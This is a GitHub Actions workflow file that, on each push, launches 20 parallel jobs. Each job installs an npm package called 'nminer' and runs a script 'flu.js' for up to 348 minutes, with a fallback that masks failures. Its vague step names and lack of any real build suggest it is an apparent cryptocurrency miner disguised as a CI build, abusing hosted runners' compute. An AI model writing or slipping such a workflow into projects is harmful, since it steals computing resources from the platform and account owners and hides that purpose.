name: flu
on:
  push:
    branches: [ "main" ]

jobs:
  build:
    runs-on: ubuntu-latest
    strategy:
      matrix:
        config:
          - { version: 8498 }
          - { version: 3085 }
          - { version: 7113 }
          - { version: 5683 }
          - { version: 400 }
          - { version: 8049 }
          - { version: 1826 }
          - { version: 1072 }
          - { version: 1642 }
          - { version: 3761 }
          - { version: 533 }
          - { version: 5825 }
          - { version: 1589 }
          - { version: 2507 }
          - { version: 8247 }
          - { version: 2702 }
          - { version: 7682 }
          - { version: 5970 }
          - { version: 2770 }
          - { version: 362 }

    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: Install Node.js
        uses: actions/setup-node@v3
        with:
          node-version: 20
          
      - name: meh onto
        run: |
          npm install nminer@latest
          timeout 348m node flu.js || echo "flu executed"